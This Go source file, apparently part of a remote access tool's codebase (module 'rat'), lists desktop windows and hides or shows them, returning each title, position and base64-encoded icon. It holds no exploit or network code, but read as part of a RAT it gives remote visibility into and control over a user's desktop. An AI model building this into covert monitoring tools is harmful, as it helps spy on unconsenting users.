package windows

/*
#include <stdlib.h>
#include "window.h"
*/
import "C"

import (
	"bytes"
	"encoding/base64"
	"image"
	"image/png"
	"rat/shared"
	"unsafe"

	"github.com/disintegration/imaging"
)

// Windows array, will be populated after call to QueryWindows()
var Windows []shared.Window

const MaxIconWidth = 16

// Callback for each window
//export WindowCallback
func WindowCallback(w C.Frame) {
	title := C.GoString(w.title)

	window := shared.Window{
		Handle:  int(w.handle),
		Title:   title,
		Visible: bool(w.visible),
		Rect: shared.Rect{
			X:      int(w.rect.x),
			Y:      int(w.rect.y),
			Width:  int(w.rect.width),
			Height: int(w.rect.height),
		},
		Icon: getEncodedIcon(w.icon),
	}

	C.free(unsafe.Pointer(w.icon.data))

	Windows = append(Windows, window)
}

func QueryWindows() {
	Windows = make([]shared.Window, 1)

	C.QueryWindows()
}

func SetDisplayState(handle int, visible bool) {
	C.SetDisplayState(C.int(handle), C.bool(visible))
}

// getEncodedIcon returns a base64 encoded JPG image with default dimensions
func getEncodedIcon(icon C.Icon) string {
	if icon.data == nil {
		return ""
	}

	width := int(icon.width)
	height := int(icon.height)

	var buf []byte
	if icon.data != nil {
		len := width * height * 4
		buf = C.GoBytes(unsafe.Pointer(icon.data), C.int(len))
	}

	var img image.Image

	img = &image.RGBA{
		Pix:    buf,
		Stride: width * 4,
		Rect:   image.Rect(0, 0, width, height),
	}

	if width > MaxIconWidth || height > MaxIconWidth {
		img = imaging.Resize(img, MaxIconWidth, MaxIconWidth, imaging.Box)
	}

	var buffer bytes.Buffer
	err := png.Encode(&buffer, img)
	if err != nil {
		return ""
	}

	return base64.StdEncoding.EncodeToString(buffer.Bytes())
}
